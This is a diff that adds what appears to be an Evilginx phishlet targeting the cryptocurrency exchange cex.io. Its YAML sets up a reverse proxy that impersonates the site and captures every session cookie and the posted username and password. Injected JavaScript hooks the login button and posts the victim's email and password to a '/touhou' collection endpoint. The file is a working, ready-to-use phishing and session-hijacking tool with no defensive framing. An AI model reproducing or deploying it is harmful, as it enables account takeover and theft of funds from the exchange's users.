@@ -1,0 +1,45 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'cex.io', session: true, is_landing: true}
+  - {phish_sub: 'profile', orig_sub: 'profile', domain: 'cex.io', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'cex.io', orig_sub: '', domain: 'cex.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'profile.cex.io', orig_sub: 'profile', domain: 'cex.io', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: 'cex.io'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/auth/oauth_callback.*'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'profile.cex.io'
+  path: '/auth/login'
+js_inject:
+  - trigger_domains: ["profile.cex.io"]
+    trigger_paths: ["/dashboard/login"]
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[class="cex-ui-button cex-ui-button-big cex-ui-button-primary-contained cex-ui-form-submit-btn"]')[0];
+        submit.setAttribute("onclick", "sendPass()", 500);
+        return;
+      }
+      function sendPass(){
+        var username = document.getElementById("email").value;
+        var pass = document.getElementById("password").value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/touhou', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("username="+encodeURIComponent(username)+"&password="+encodeURIComponent(pass));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
+  
